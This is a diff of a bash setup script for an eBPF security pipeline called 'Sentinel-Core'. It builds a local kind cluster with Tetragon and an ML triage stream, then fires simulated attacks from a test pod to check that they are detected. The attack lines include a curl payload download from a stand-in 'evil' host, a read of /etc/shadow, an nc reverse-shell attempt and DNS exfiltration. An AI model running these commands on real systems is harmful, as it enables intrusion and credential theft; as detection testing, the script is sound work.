@@ -7,44 +7,47 @@ if [ -f ".venv/bin/activate" ]; then
 fi
 
 echo "============================================================"
-echo "  Sentinel-Core: Real eBPF Security Pipeline"
+echo "  Sentinel-Core: Real eBPF Security Pipeline (Dashboard Sync)"
 echo "============================================================"
 
-# ── 1. Hermetic Toolchain ────────────────────────────────────────
+# ── 1. Tooling dependencies ────────────────────────────────────────
 mkdir -p bin
 export PATH="$PWD/bin:$PATH"
 
 echo "[1/6] Checking tooling dependencies..."
 if ! command -v kind &>/dev/null; then
-    echo "  ↳ Downloading kind..."
     curl -sLo ./bin/kind https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64
     chmod +x ./bin/kind
 fi
 if ! command -v kubectl &>/dev/null; then
-    echo "  ↳ Downloading kubectl..."
     curl -sLo ./bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl"
     chmod +x ./bin/kubectl
 fi
 if ! command -v helm &>/dev/null; then
-    echo "  ↳ Downloading helm..."
     curl -fsSL -o /tmp/get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
     chmod 700 /tmp/get_helm.sh
     HELM_INSTALL_DIR=$PWD/bin USE_SUDO="false" /tmp/get_helm.sh >/dev/null 2>&1 || true
     rm -f /tmp/get_helm.sh
 fi
-echo "  ✓ kind=$(kind --version 2>/dev/null | awk '{print $3}')"
-echo "  ✓ kubectl=$(kubectl version --client -o json 2>/dev/null | python3 -c 'import sys,json;print(json.load(sys.stdin)["clientVersion"]["gitVersion"])' 2>/dev/null || echo 'ok')"
-echo "  ✓ helm=$(helm version --short 2>/dev/null)"
+echo "  ✓ Tools ready"
 
 CLUSTER_NAME="sentinel-cluster"
 
-# ── 2. Kubernetes Cluster ────────────────────────────────────────
+# ── 2. Kubernetes Cluster (with Health Check) ────────────────────
 echo ""
 echo "[2/6] Provisioning Kubernetes cluster..."
 if kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
-    echo "  ✓ Cluster '${CLUSTER_NAME}' already exists"
-else
-    echo "  ↳ Creating kind cluster with kernel debug/trace mounts..."
+    # Check if cluster is healthy (can list nodes)
+    if ! kubectl get nodes &>/dev/null; then
+        echo "  ⚠️  Cluster exists but is unhealthy. Recreating..."
+        kind delete cluster --name "${CLUSTER_NAME}"
+    else
+        echo "  ✓ Cluster '${CLUSTER_NAME}' is active"
+    fi
+fi
+
+if ! kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
+    echo "  ↳ Creating kind cluster..."
     cat > /tmp/kind-config.yaml <<'KINDEOF'
 kind: Cluster
 apiVersion: kind.x-k8s.io/v1alpha4
@@ -62,67 +65,38 @@ KINDEOF
     rm -f /tmp/kind-config.yaml
 fi
 
-# Mount tracefs/debugfs inside the Kind node (required for eBPF on Arch)
-echo "  ↳ Mounting kernel trace filesystems inside node..."
-docker exec ${CLUSTER_NAME}-control-plane \
-    mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null || true
-docker exec ${CLUSTER_NAME}-control-plane \
-    mount -t debugfs debugfs /sys/kernel/debug 2>/dev/null || true
+# Ensure tracefs/debugfs mounts inside node
+docker exec ${CLUSTER_NAME}-control-plane mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null || true
+docker exec ${CLUSTER_NAME}-control-plane mount -t debugfs debugfs /sys/kernel/debug 2>/dev/null || true
 
 # ── 3. Tetragon eBPF Agent ───────────────────────────────────────
 echo ""
 echo "[3/6] Deploying Tetragon eBPF agent..."
-if helm list -n kube-system 2>/dev/null | grep -q tetragon; then
-    echo "  ✓ Tetragon already installed"
-else
-    echo "  ↳ Installing via Helm with tracefs/debugfs mounts..."
+if ! helm list -n kube-system 2>/dev/null | grep -q tetragon; then
     helm repo add cilium https://helm.cilium.io >/dev/null 2>&1
     helm repo update >/dev/null 2>&1
     helm install tetragon cilium/tetragon -n kube-system -f tetragon-values.yaml --wait --timeout=180s
 fi
-
-echo "  ↳ Waiting for Tetragon readiness..."
-kubectl wait --for=condition=ready pod \
-    -l app.kubernetes.io/name=tetragon \
-    -n kube-system --timeout=180s
-
-echo "  ↳ Applying TracingPolicy..."
 kubectl apply -f sentinel-policy.yaml
+echo "  ✓ Tetragon is LIVE"
 
-echo "  ✓ Tetragon is LIVE and monitoring"
-
-# ── 4. Deploy Real Attack Pod ────────────────────────────────────
+# ── 4. Deploy Attacker Pod ───────────────────────────────────────
 echo ""
-echo "[4/6] Deploying attacker workload into cluster..."
+echo "[4/6] Preparing attacker workload..."
 kubectl delete pod attacker-pod --ignore-not-found=true >/dev/null 2>&1
-kubectl run attacker-pod \
-    --image=alpine/curl:latest \
-    --restart=Never \
-    -- sleep 3600
-echo "  ↳ Waiting for attacker pod..."
+kubectl run attacker-pod --image=alpine/curl:latest --restart=Never -- sleep 3600
 kubectl wait --for=condition=ready pod attacker-pod --timeout=60s
-echo "  ✓ Attacker pod is LIVE in namespace: default"
+echo "  ✓ Workload ready"
 
-# ── 5. Execute Real Attacks ──────────────────────────────────────
+# ── 5. Start Pipeline (Background) ──────────────────────────────
 echo ""
-echo "[5/6] Executing REAL attack commands inside the cluster..."
-echo "  ↳ Attack 1: Downloading external payload via curl"
-kubectl exec attacker-pod -- curl -sk http://evil.example.com/payload.sh -o /dev/null 2>/dev/null || true
-echo "  ↳ Attack 2: Reading /etc/shadow (privilege escalation recon)"
-kubectl exec attacker-pod -- cat /etc/shadow 2>/dev/null || true
-echo "  ↳ Attack 3: Attempting reverse shell via nc"
-kubectl exec attacker-pod -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" 2>/dev/null &
-echo "  ↳ Attack 4: Process enumeration"
-kubectl exec attacker-pod -- ps aux 2>/dev/null || true
-echo "  ↳ Attack 5: DNS exfiltration attempt"
-kubectl exec attacker-pod -- nslookup evil.example.com 2>/dev/null || true
-echo "  ✓ All attack commands executed in real cluster"
+echo "[5/6] Starting ML + RAG Pipeline..."
+docker compose up -d redis chromadb
+sleep 2
 
-# ── 6. Stream + Analyze ──────────────────────────────────────────
-echo ""
-echo "[6/6] Starting Sentinel-Core ML + RAG Pipeline..."
 export PYTHONPATH="$PWD:$PYTHONPATH"
 
+# Generate the improved live script
 cat << 'PYEOF' > _sentinel_live.py
 import sys
 import time
@@ -130,6 +104,11 @@ import json
 import logging
 import threading
 from pathlib import Path
+
+# Suppress noisy library logs
+logging.getLogger("httpx").setLevel(logging.WARNING)
+logging.getLogger("sentence_transformers").setLevel(logging.WARNING)
+logging.getLogger("urllib3").setLevel(logging.WARNING)
 
 import uvicorn
 from forwarder.api import app as fastapi_app
@@ -153,11 +132,17 @@ config = Config()
 def run_api():
     uvicorn.run(fastapi_app, host="0.0.0.0", port=8081, log_level="warning")
 threading.Thread(target=run_api, daemon=True).start()
-time.sleep(2)
 
-# ML Triage
+# ML Triage - Try huge model if exists, fallback to config
+huge_model = Path("xgboost_model.json")
+if huge_model.exists() and huge_model.stat().st_size > 1000000:
+    logger.info("🧠 Found high-capacity model in root. Overriding config.")
+    ml_path = huge_model
+else:
+    ml_path = Path(config.ML_MODEL_PATH)
+
 ml = MLTriage(
-    model_path=Path(config.ML_MODEL_PATH),
+    model_path=ml_path,
     feature_list_path=Path(config.FEATURE_LIST_PATH)
 )
 set_ml_triage(ml)
@@ -167,23 +152,15 @@ forwarder.main._ml_triage = ml
 pub = EventPublisher(config)
 set_redis_status(pub.is_connected)
 
-# Try to trigger RAG + Gemini orchestration for high-severity events
+# RAG check
 try:
     from orchestrator import analyze_alert, ORCHESTRATOR_AVAILABLE
     rag_enabled = ORCHESTRATOR_AVAILABLE
-    if rag_enabled:
-        logger.info("🧠 RAG + Gemini orchestrator is ONLINE")
-    else:
-        logger.warning("⚠️  Orchestrator offline (missing API keys). ML triage only.")
 except ImportError:
     rag_enabled = False
-    logger.warning("⚠️  Orchestrator module not available")
 
-print()
-print("🚀 Sentinel API: http://127.0.0.1:8081")
-print("📡 Processing REAL eBPF telemetry from Kubernetes cluster...")
-print("   Press Ctrl+C to stop")
-print()
+print("\n🚀 Sentinel API: http://127.0.0.1:8081")
+print("📡 Pipeline INITIALIZED and monitoring events...")
 
 event_count = 0
 try:
@@ -199,34 +176,60 @@ try:
                 grade = triage.get("grade", "UNKNOWN")
                 score = float(triage.get("confidence", 0.0))
 
-                # For TP/BP events, run through the full orchestrator (RAG + Gemini)
                 if rag_enabled and grade in ("TP", "BP") and event_count <= 20:
                     try:
                         raw = json.loads(line)
-                        result = analyze_alert(
-                            raw_event=raw,
-                            guide_score=score,
-                            guide_grade=grade,
-                            stream=False
-                        )
-                        if result.get("final_report"):
-                            logger.info("📋 ORCHESTRATOR REPORT:\n%s", result["final_report"][:500])
-                        if result.get("yaml_fix"):
-                            logger.info("🔧 YAML FIX:\n%s", result["yaml_fix"][:300])
+                        analyze_alert(raw_event=raw, guide_score=score, guide_grade=grade, stream=False)
                     except Exception as orch_err:
                         logger.warning("Orchestrator error: %s", orch_err)
-
         except Exception as e:
             logger.error("Event decode error: %s", e)
 
 except KeyboardInterrupt:
-    logger.info("Pipeline terminated. Processed %d events.", event_count)
+    logger.info("Pipeline terminated.")
     pub.close()
     sys.exit(0)
 PYEOF
 
+# Start the pipeline stream in the background
+echo "  ↳ Initializing ML models and starting stream (bg)..."
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f --since=1s | python _sentinel_live.py &
+PIPELINE_PID=$!
+
+# Wait for API to be ready
+echo "  ↳ Waiting for API readiness..."
+until curl -s http://127.0.0.1:8081/health &>/dev/null; do
+    sleep 2
+    if ! ps -p $PIPELINE_PID > /dev/null; then
+        echo "  ❌ Pipeline failed to start. Check logs."
+        exit 1
+    fi
+done
+sleep 5 # Extra buffer for model loading
+
+# ── 6. Execute Attacks (Now that pipeline is listening) ──────────
+echo ""
+echo "[6/6] Executing REAL attacks (Pipeline is now LISTENING)..."
+echo "  ↳ Attack 1: Payload Download"
+kubectl exec attacker-pod -- curl -sk http://evil-example.com/p.sh -o /dev/null 2>/dev/null || true
+echo "  ↳ Attack 2: Sensitive File Access"
+kubectl exec attacker-pod -- cat /etc/shadow 2>/dev/null || true
+echo "  ↳ Attack 3: Reverse Shell"
+kubectl exec attacker-pod -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" 2>/dev/null || true
+echo "  ↳ Attack 4: Discovery"
+kubectl exec attacker-pod -- ps aux >/dev/null 2>&1 || true
+
+echo "  ✓ Attacks completed"
+echo ""
 echo "============================================================"
-echo "  STREAM ACTIVE — Real eBPF events flowing"
+echo "  FINAL EVENT ANALYSIS (Array View)"
 echo "============================================================"
-kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon \
-    -c export-stdout -f --since=1m | python3 _sentinel_live.py
+sleep 3
+# Fetch the results array from the API, just as before
+curl -s http://127.0.0.1:8081/events/latest | python -m json.tool
+
+echo ""
+echo "📡 Pipeline is still running in background (PID: $PIPELINE_PID)."
+echo "📡 Dashboard can connect to http://localhost:8081"
+echo "Press Ctrl+C to tail logs or 'kill $PIPELINE_PID' to stop."
+wait $PIPELINE_PID
